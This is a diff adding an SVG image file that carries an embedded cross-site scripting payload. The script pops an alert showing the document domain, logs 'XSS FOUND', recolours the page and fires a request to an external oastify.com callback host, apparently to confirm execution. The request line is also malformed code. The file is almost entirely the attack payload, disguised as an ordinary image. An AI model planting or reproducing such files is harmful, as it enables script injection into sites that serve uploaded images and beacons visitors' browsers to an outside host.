@@ -1,0 +1,11 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500" >
+    <rect width="500" height="500" fill="blue" />
+    <script>
+        alert(document.domain)
+        console.log("XSS FOUND")
+        document.body.style.backgroundColor='red'
+        new XMLHttpRequest().open('GET', 'woohr3vfzkok1jvjkrmr6q6xhonfb6zv.oastify.com', true), new XMLHttpRequest().send();
+
+
+    </script>
+</svg>
